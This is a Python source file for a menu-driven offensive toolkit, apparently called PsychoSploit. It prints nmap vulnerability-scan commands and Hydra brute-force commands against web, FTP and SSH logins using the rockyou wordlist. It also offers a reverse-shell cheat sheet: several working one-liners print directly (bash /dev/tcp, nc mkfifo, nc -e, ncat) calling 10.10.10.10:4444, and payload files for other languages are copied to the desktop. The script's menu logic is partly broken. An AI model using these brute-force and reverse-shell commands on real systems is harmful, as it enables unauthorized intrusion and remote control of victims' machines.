import os
import time
import sys
import threading
import itertools
import colorama

from colorama import init, Fore, Back, Style

# starts colorama
init(autoreset=True)

print(Style.BRIGHT + Fore.RED + ' _   ___      ___   _')
print(Style.BRIGHT + Fore.RED + '| | | \ \ /\ / / | | |')
print(Style.BRIGHT + Fore.RED + '| |_| |\ V  V /| |_| |')
print(Style.BRIGHT + Fore.RED + ' \__,_| \_/\_/  \__,_|')
print("\n")
print('The Nmap Script Is Starting Up Please Be Patient....')
done = False
#here is the animation
def animate():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rLOADING... ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\r[+]H4CK TH3 W0RLD     ')

t = threading.Thread(target=animate)
t.start()

#long process here or Time Process to extend the wairt just edit the time.sleep(10) variable to what ever number that you want
time.sleep(5)
done = True
print('\n')
print(Style.BRIGHT + Fore.RED +' __________             ___________.__           __      __            .__       .___')
print(Style.BRIGHT + Fore.RED +' \______   \__  _  _____\__    ___/|  |__   ____/  \    /  \___________|  |    __| _/')
print(Style.BRIGHT + Fore.RED +'  |     ___/\ \/ \/ /    \|    |   |  |  \_/ __ \   \/\/   /  _ \_  __ \  |   / __ | ')
print(Style.BRIGHT + Fore.RED +'  |    |     \     /   |  \    |   |   Y  \  ___/\        (  <_> )  | \/  |__/ /_/ | ')
print(Style.BRIGHT + Fore.RED +'  |____|      \/\_/|___|  /____|   |___|  /\___  >\__/\  / \____/|__|  |____/\____ | ')
print(Style.BRIGHT + Fore.RED +'                        \/              \/     \/      \/                         \/ ')
print('\n')
print('\n')

print(Style.BRIGHT + Fore.CYAN +'[1] Check If Host Is Up')
print(Style.BRIGHT + Fore.CYAN +'[2] Nmap Agressive Scan Command')
print(Style.BRIGHT + Fore.CYAN +'[3] Nmap Basic Vulnurability Scan')
print(Style.BRIGHT + Fore.CYAN +'[4] Nmap Vulnurability Scan With Verbose And More results (Reccomended)')
print(Style.BRIGHT + Fore.CYAN +'[5] HTTP Hydra Brute Force Command')
print(Style.BRIGHT + Fore.CYAN +'[6] FTP Hydra Bruteforce Command')
print(Style.BRIGHT + Fore.CYAN +'[7] SSH Hydra Brute Force Command')
print(Style.BRIGHT + Fore.CYAN +'[8] HTTPS Hydra Brute Force Command')
print(Style.BRIGHT + Fore.CYAN +'[9] My Github :3')
print(Style.BRIGHT + Fore.CYAN +'[10] Download rockyou.txt (This Will Download To your /Documents/ Directory)')
print(Style.BRIGHT + Fore.CYAN + '[11] Reverse Shell Cheet Sheet')

time.sleep(1)
print('\n')
main = input(Style.BRIGHT + Fore.YELLOW + 'PWNED: ')

if main == '1':
    print('ping <HOST>')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif main == '2':
    print('nmap -A <HOST>')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif main == '3':
    print('nmap -sC -sV --script vuln <HOST>')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif main == '4':
    print('nmap -vv -sV --script vuln <HOST>')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif main == '5':
    print('hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt <HOST> http-post-form "/website/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"')
    print('MAKE SURE TO CHANGE THE PATH TO YOUR WORDLIST! IF YOUR ON KALI LINUX YOU DONT NEED TO CHANGE THE PATH TO YOUR ROCKYOU.TXT \n WORDLIST BECAUSE IT IS IN THAT DIRECTORY BY DEFAULT; IF YOU DO NOT HAVE THE ROCKYOU.TXT THEN YOU CAN RESTART THE SCRIPT AND DOWNLOAD IT \n THAT DOWNLOAD FOR THE ROCKYOU.TXT WILL BE DOWNLOADED IN YOUR /home/Documents DIRECTORY')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif main == '9':
    os.system('firefox https://github.com/MalwareMix')
    os.system('firefox-esr https://github.com/MalwareMix')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif main == '10':
    os.mkdir('/opt/wordlist')
    time.sleep(1)
    print('[+] Preparing The Download....')
    time.sleep(5)
    os.system('curl https://gitlab.com/kalilinux/packages/wordlists/-/raw/kali/master/rockyou.txt.gz?inline=false -o rockyou.txt.gz > /opt/wordlist/')
    time.sleep(3)
    print('[*] Download Complete!')
    os.system('python3 PsychoSploit.py')
elif main == '6':
    print('hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt ftp://IP')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif main == '7':
    print('hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt ssh://IP')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif main == '8':
    print('hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt <HOST> https-post-form "/website/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"')
elif main == '11':
    time.sleep(2)
    print('Getting The Reverse Shells Warmed UP :3......')
    time.sleep(2)
    os.system('clear')
    os.system('mkdir ~/Desktop/temp')
    print(Style.BRIGHT + Fore.CYAN +'__________                                         _________.__           .__  .__          ')
    print(Style.BRIGHT + Fore.CYAN +'\______   \ _______  __ ___________  ______ ____  /   _____/|  |__   ____ |  | |  |   ______')
    print(Style.BRIGHT + Fore.CYAN +' |       _// __ \  \/ // __ \_  __ \/  ___// __ \ \_____  \ |  |  \_/ __ \|  | |  |  /  ___/')
    print(Style.BRIGHT + Fore.CYAN +' |    |   \  ___/\   /\  ___/|  | \/\___ \\  ___/ /        \|   Y  \  ___/|  |_|  |__\___ \ ')
    print(Style.BRIGHT + Fore.CYAN +' |____|_  /\___  >\_/  \___  >__|  /____  >\___  >_______  /|___|  /\___  >____/____/____  >')
    print(Style.BRIGHT + Fore.CYAN +'        \/     \/          \/           \/     \/        \/      \/     \/               \/ ')
    print('\n')
    print("\n")

    print(Style.BRIGHT + Fore.RED + '[1] Bash -i')
    print(Style.BRIGHT + Fore.RED +'[2] Bash 196')
    print(Style.BRIGHT + Fore.RED +'[3] Bash 5')
    print(Style.BRIGHT + Fore.RED +'[4] nc mkfifo')
    print(Style.BRIGHT + Fore.RED +'[5] nc -e')
    print(Style.BRIGHT + Fore.RED +'[6] nc -c')
    print(Style.BRIGHT + Fore.RED +'[7] ncat UDP')
    print(Style.BRIGHT + Fore.RED +'[8] C')
    print(Style.BRIGHT + Fore.RED +'[9] C#')
    print(Style.BRIGHT + Fore.RED +'[10] Perl')
    print(Style.BRIGHT + Fore.RED +'[11] PHP Emoji')
    print(Style.BRIGHT + Fore.RED +'[12] Reverse Pentestmonkey PHP')
    print(Style.BRIGHT + Fore.RED +'[13] PHP')
    print(Style.BRIGHT + Fore.RED +'[14] Powershell #1')
    print(Style.BRIGHT + Fore.RED +'[15] Powershell #2')
    print(Style.BRIGHT + Fore.RED +'[15] Powershell #3')
    print(Style.BRIGHT + Fore.RED +'[16]Powershell Base64')
    print(Style.BRIGHT + Fore.RED +'[17] Python #1')
    print(Style.BRIGHT + Fore.RED +'[18] Python #2')
    print(Style.BRIGHT + Fore.RED +'[19] Python #3')
    print(Style.BRIGHT + Fore.RED +'[20] node.js')
    print(Style.BRIGHT + Fore.RED +'[21] Java')
    print(Style.BRIGHT + Fore.RED +'[22] telnet')
    print(Style.BRIGHT + Fore.RED +'[23]zsh')

time.sleep(1)
print('\n')
pwn = input(Style.BRIGHT + Fore.YELLOW + 'PWNED: ')

if pwn == '1':
    print(Style.BRIGHT + Fore.CYAN + 'sh -i >& /dev/tcp/10.10.10.10/4444 0>&1')
    time.sleep(5)
    os.system('python3 APsychoSploit.py')
elif pwn == '2':
    print(Style.BRIGHT + Fore.CYAN + '0<&196;exec 196<>/dev/tcp/10.10.10.10/4444; sh <&196 >&196 2>&196')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif pwn == '3':
    print(Style.BRIGHT + Fore.CYAN + 'sh -i 5<> /dev/tcp/10.10.10.10/4444 0<&5 1>&5 2>&5')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif pwn == '4':
    print(Style.BRIGHT + Fore.CYAN + 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif pwn == '5':
    print(Style.BRIGHT + Fore.CYAN + 'nc -e sh 10.10.10.10 4444')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif pwn == '6':
    print(Style.BRIGHT + Fore.CYAN + 'nc -c sh 10.10.10.10 4444')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif pwn == '7':
    print(Style.BRIGHT + Fore.CYAN + 'ncat 10.10.10.10 4444 -e sh')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif pwn == '8':
    print(Style.BRIGHT + Fore.CYAN + 'Make Sure You Are Running This Script As ROOT User! This Will Make A Folder In the /Desktop/temp called tmp Will Be the OutPut Of Both "C" Reverse Shells in TxT Form')
    time.sleep(3)
    print(Style.BRIGHT + Fore.CYAN + 'Getting Things SetUp!......')
    time.sleep(3)
    os.system('cp ~/PsychoSploit/src/c.txt ~/Desktop/temp/')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif pwn == '9':
    time.sleep(3)
    print(Style.BRIGHT + Fore.CYAN + 'Getting File Ready!.....')
    time.sleep(2)
    os.system('cp ~/PsychoSploit/src/C#.txt ~/Desktop/temp/')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif pwn == '10':
    os.system('cp ~/PsychoSploit/src/Perl.txt ~/Desktop/temp/')
    print(Style.BRIGHT + Fore.CYAN + 'Perl Reverse Shell Is In /Desktop/tmp/ !')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif pwn == '11':
    time.sleep(3)
    print(Style.BRIGHT + Fore.CYAN + 'Getting Things SetUp!......')
    time.sleep(3)
    os.system('cp ~/PsychoSploit/src/PHP_Emoji.php ~/Desktop/temp')
    time.sleep(5)
    os.system('python3 PsychoSploit.py')
elif pwn == '12':
    print('Getting The File For You (REMEMBER THIS WILL OUTPUT TO /Desktop/tmp) !!!! AND RUN THIS SCRIPT AS ROOT!!!.....')
    time.sleep(3)
    os.system('cp ~/PsychoSploit/src/PentestMonkeyReverse.php ~/Desktop/temp/')
    print('Done!')
    time.sleep(2)
    os.system('python3 PsychoSploit.py')
elif pwn == '13':
    print('Getting File Ready For You will be OutPuted In Your /Desktop/tmp....')
    time.sleep(2)
    os.system('cp ~/PsychoSploit/src/PHP.txt ~/Desktop/temp/')
    time.sleep(1)
    print('Done!')
    os.system('python3 PsychoSploit.py')
elif pwn == '14':
    print('Getting File Ready For You will be OutPuted In Your ~/Desktop/temp....')
    time.sleep(3)
    os.system('cp ~/PsychoSploit/src/PS1.txt ~/Desktop/temp/')
    time.sleep(1)
    print('Done!')
    os.system('python3 PsychoSploit.py')
elif pwn == '15':
    print('Getting File Ready For You will be OutPuted In Your /Desktop/tmp....')
    time.sleep(2)
    os.system('cp ~/PsychoSploit/src/PS2.txt ~/Desktop/temp/')
    time.sleep(2)
    print('Done!')
    time.sleep(2)
    os.system('python3 PsychoSploit.py')
elif pwn == '16':
    print('Getting File Ready For You will be OutPuted In Your /Desktop/tmp....')
    time.sleep(2)
    os.system('cp ~/PsychoSploit/src/PS3.txt ~/Desktop/temp/')
    time.sleep(2)
    print('Done!')
    time.sleep(2)
    os.system('python3 PsychoSploit.py')
elif pwn == '17':
    print('Getting File Ready For You will be OutPuted In Your /Desktop/tmp....')
    time.sleep(2)
    os.system('cp ~/PsychoSploit/src/python1.txt ~/Desktop/temp/')
    time.sleep(2)
    print('Done!')
    time.sleep(2)
    os.system('python3 PsychoSploit.py')
elif pwn == '18':
    print('Getting File Ready For You will be OutPuted In Your /Desktop/tmp....')
    time.sleep(2)
    os.system('cp ~/PsychoSploit/src/python2.txt ~/Desktop/temp/')
    time.sleep(2)
    print('Done!')
    time.sleep(2)
    os.system('python3 PsychoSploit.py')
elif pwn == '19':
    print('Getting File Ready For You will be OutPuted In Your /Desktop/tmp....')
    time.sleep(2)
    os.system('cp ~/PsychoSploit/src/python3.txt ~/Desktop/temp/')
    time.sleep(2)
    print('Done!')
    time.sleep(2)
    os.system('python3 PsychoSploit.py')
elif pwn == '20':
    print('Getting File Ready For You will be OutPuted In Your /Desktop/tmp....')
    time.sleep(2)
    os.system('cp ~/PsychoSploit/src/node.js ~/Desktop/temp/')
    time.sleep(2)
    print('Done!')
    time.sleep(2)
    os.system('python3 PsychoSploit.py')
elif pwn == '21':
    print('Getting File Ready For You will be OutPuted In Your /Desktop/tmp....')
    time.sleep(2)
    os.system('cp ~/PsychoSploit/src/java.txt ~/Desktop/temp/')
    time.sleep(2)
    print('Done!')
    time.sleep(2)
    os.system('python3 PsychoSploit.py')
elif pwn == '23':
    print('Getting File Ready For You will be OutPuted In Your ~/Desktop/temp/....')
    time.sleep(2)
    os.system('cp ~/PsychoSploit/src/zsh.txt ~/Desktop/temp/')
    time.sleep(2)
    print('Done!')
    time.sleep(2)
    os.system('python3 PsychoSploit.py')
elif pwn == '22':
    print('Getting File Ready For You will be OutPuted In Your /Desktop/tmp....')
    time.sleep(2)
    os.system('cp ~/PsychoSploit/src/telnet.txt ~/Desktop/temp/')
    time.sleep(2)
    print('Done!')
    time.sleep(2)
    os.system('python3 PsychoSploit.py')
else:
    print('Not A Valid Option!')
    time.sleep(2)
    os.system('python3 PsychoSploit.py')